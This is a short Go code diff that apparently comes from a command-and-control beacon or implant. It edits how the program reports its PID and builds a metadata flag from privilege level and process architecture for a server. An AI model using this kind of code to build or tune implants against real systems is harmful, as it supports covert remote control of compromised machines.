@@ -49,7 +49,9 @@ func GetProcessName() string {
 }
 
 func GetPID() int {
-	return os.Getpid()
+	pid := os.Getpid()
+	util.Println(util.Sprintf("Pid: %d", pid))
+	return pid
 }
 
 func GetComputerName() string {
@@ -68,6 +70,7 @@ func GetComputerName() string {
 }
 
 func GetMetaDataFlag() byte {
+	// there is no need to add 1 when process is x86, or it will make server discard some message
 	flagInt := byte(0)
 	if IsHighPriv() {
 		flagInt += 8
@@ -77,8 +80,6 @@ func GetMetaDataFlag() byte {
 	}
 	if IsProcessX64() {
 		flagInt += 2
-	} else {
-		flagInt += 1
 	}
 	return flagInt
 }
